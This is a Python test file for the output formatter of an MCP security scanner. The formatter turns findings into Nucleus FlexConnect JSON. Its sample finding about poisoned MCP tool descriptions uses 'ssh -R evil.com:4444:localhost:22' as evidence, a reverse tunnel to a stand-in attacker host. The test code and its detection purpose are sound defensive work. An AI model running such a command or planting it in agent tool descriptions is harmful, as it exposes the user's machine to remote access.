"""Tests for the Nucleus FlexConnect output formatter."""

from __future__ import annotations

import json
from datetime import UTC, datetime

import pytest

from mcp_audit.models import Finding, ScanResult, Severity
from mcp_audit.output.nucleus import format_nucleus

_TEST_PREFIX = "test-host"

# ── Helpers ────────────────────────────────────────────────────────────────────

_FIXED_TS = datetime(2026, 4, 12, 14, 30, 0, tzinfo=UTC)


def _make_finding(
    *,
    finding_id: str = "POISON-001",
    severity: Severity = Severity.CRITICAL,
    client: str = "cursor",
    server: str = "filesystem-server",
    title: str = "SSH key exfiltration",
    description: str = "Tool description contains SSH exfiltration command.",
    evidence: str = "ssh -R evil.com:4444:localhost:22",
    remediation: str = "Remove the server from your configuration.",
    cwe: str | None = "CWE-506",
    finding_path: str | None = "/home/user/.cursor/mcp.json",
) -> Finding:
    return Finding(
        id=finding_id,
        severity=severity,
        analyzer="poisoning",
        client=client,
        server=server,
        title=title,
        description=description,
        evidence=evidence,
        remediation=remediation,
        cwe=cwe,
        finding_path=finding_path,
    )


def _make_result(findings: list[Finding] | None = None) -> ScanResult:
    result = ScanResult(
        clients_scanned=1,
        servers_found=2,
        findings=findings or [],
    )
    # Pin timestamp for deterministic assertions.
    result.timestamp = _FIXED_TS
    return result


def _parse(result: ScanResult, asset_prefix: str = _TEST_PREFIX) -> dict:
    return json.loads(format_nucleus(result, asset_prefix=asset_prefix))


# ── Top-level document structure ───────────────────────────────────────────────


class TestDocumentStructure:
    def test_returns_valid_json(self) -> None:
        out = format_nucleus(_make_result())
        parsed = json.loads(out)  # raises if invalid
        assert isinstance(parsed, dict)

    def test_nucleus_import_version(self) -> None:
        doc = _parse(_make_result())
        assert doc["nucleus_import_version"] == "1"

    def test_scan_tool(self) -> None:
        doc = _parse(_make_result())
        assert doc["scan_tool"] == "mcp-audit"

    def test_scan_type(self) -> None:
        doc = _parse(_make_result())
        assert doc["scan_type"] == "Application"

    def test_scan_date_format(self) -> None:
        doc = _parse(_make_result())
        # FlexConnect expects "YYYY-MM-DD HH:MM:SS"
        assert doc["scan_date"] == "2026-04-12 14:30:00"

    def test_findings_key_present(self) -> None:
        doc = _parse(_make_result())
        assert "findings" in doc
        assert isinstance(doc["findings"], list)

    def test_empty_result_has_empty_findings(self) -> None:
        doc = _parse(_make_result(findings=[]))
        assert doc["findings"] == []

    def test_required_top_level_keys_complete(self) -> None:
        doc = _parse(_make_result())
        required = {
            "nucleus_import_version",
            "scan_tool",
            "scan_type",
            "scan_date",
            "findings",
        }
        assert required.issubset(doc.keys())


# ── Finding field mapping ──────────────────────────────────────────────────────


class TestFindingMapping:
    def setup_method(self) -> None:
        self.finding = _make_finding()
        self.doc = _parse(_make_result(findings=[self.finding]))
        self.row = self.doc["findings"][0]

    def test_asset_name_format(self) -> None:
        assert self.row["asset_name"] == f"{_TEST_PREFIX}/cursor/filesystem-server"

    def test_finding_number_is_dedup_key(self) -> None:
        assert self.row["finding_number"] == "POISON-001"

    def test_finding_name(self) -> None:
        assert self.row["finding_name"] == "SSH key exfiltration"

    def test_finding_description(self) -> None:
        assert self.row["finding_description"] == (
            "Tool description contains SSH exfiltration command."
        )

    def test_finding_solution(self) -> None:
        assert self.row["finding_solution"] == (
            "Remove the server from your configuration."
        )

    def test_finding_output(self) -> None:
        assert self.row["finding_output"] == "ssh -R evil.com:4444:localhost:22"

    def test_finding_path(self) -> None:
        assert self.row["finding_path"] == "/home/user/.cursor/mcp.json"

    def test_finding_result_always_fail(self) -> None:
        assert self.row["finding_result"] == "Fail"

    def test_finding_type_always_vulnerability(self) -> None:
        assert self.row["finding_type"] == "Vulnerability"

    def test_finding_cve_populated_from_cwe(self) -> None:
        assert self.row["finding_cve"] == "CWE-506"

    def test_finding_cve_omitted_when_no_cwe(self) -> None:
        finding = _make_finding(cwe=None)
        doc = _parse(_make_result(findings=[finding]))
        assert "finding_cve" not in doc["findings"][0]

    def test_finding_path_empty_string_when_none(self) -> None:
        finding = _make_finding(finding_path=None)
        doc = _parse(_make_result(findings=[finding]))
        assert doc["findings"][0]["finding_path"] == ""


# ── Severity mapping ───────────────────────────────────────────────────────────


class TestSeverityMapping:
    @pytest.mark.parametrize(
        "severity,expected",
        [
            (Severity.CRITICAL, "Critical"),
            (Severity.HIGH, "High"),
            (Severity.MEDIUM, "Medium"),
            (Severity.LOW, "Low"),
            (Severity.INFO, "Informational"),
        ],
    )
    def test_severity_values(self, severity: Severity, expected: str) -> None:
        finding = _make_finding(severity=severity)
        doc = _parse(_make_result(findings=[finding]))
        assert doc["findings"][0]["finding_severity"] == expected


# ── Multiple findings ──────────────────────────────────────────────────────────


class TestMultipleFindings:
    def test_finding_count_matches(self) -> None:
        findings = [
            _make_finding(finding_id="POISON-001", server="evil-calc"),
            _make_finding(
                finding_id="CRED-001", server="github", severity=Severity.HIGH
            ),
            _make_finding(
                finding_id="TRANSPORT-001", server="sus-api", severity=Severity.MEDIUM
            ),
        ]
        doc = _parse(_make_result(findings=findings))
        assert len(doc["findings"]) == 3

    def test_each_finding_has_unique_dedup_key(self) -> None:
        findings = [
            _make_finding(finding_id="POISON-001"),
            _make_finding(finding_id="CRED-001"),
        ]
        doc = _parse(_make_result(findings=findings))
        numbers = [f["finding_number"] for f in doc["findings"]]
        assert len(set(numbers)) == len(numbers)

    def test_finding_order_preserved(self) -> None:
        ids = ["SC-001", "TRANSPORT-003", "CRED-002"]
        findings = [_make_finding(finding_id=fid) for fid in ids]
        doc = _parse(_make_result(findings=findings))
        assert [f["finding_number"] for f in doc["findings"]] == ids

    def test_asset_name_includes_client(self) -> None:
        findings = [
            _make_finding(client="claude", server="fs"),
            _make_finding(client="cursor", server="gh", finding_id="CRED-001"),
        ]
        doc = _parse(_make_result(findings=findings))
        asset_names = {f["asset_name"] for f in doc["findings"]}
        assert f"{_TEST_PREFIX}/claude/fs" in asset_names
        assert f"{_TEST_PREFIX}/cursor/gh" in asset_names


# ── Output is pretty-printed JSON ─────────────────────────────────────────────


class TestOutputFormat:
    def test_output_is_indented(self) -> None:
        out = format_nucleus(_make_result(findings=[_make_finding()]))
        # Pretty-printed JSON has newlines and indentation
        assert "\n" in out
        assert "  " in out

    def test_output_is_string(self) -> None:
        assert isinstance(format_nucleus(_make_result()), str)


# ── scanner.py integration: finding_path is backfilled ────────────────────────


class TestFindingPathBackfill:
    """Verify that the Finding model accepts and stores finding_path."""

    def test_finding_path_field_exists(self) -> None:
        f = _make_finding(finding_path="/some/path/mcp.json")
        assert f.finding_path == "/some/path/mcp.json"

    def test_finding_path_defaults_none(self) -> None:
        f = Finding(
            id="X-001",
            severity=Severity.LOW,
            analyzer="test",
            client="claude",
            server="srv",
            title="t",
            description="d",
            evidence="e",
            remediation="r",
        )
        assert f.finding_path is None

    def test_finding_path_survives_round_trip(self) -> None:
        f = _make_finding(finding_path="/Users/me/.cursor/mcp.json")
        dumped = f.model_dump()
        restored = Finding(**dumped)
        assert restored.finding_path == "/Users/me/.cursor/mcp.json"
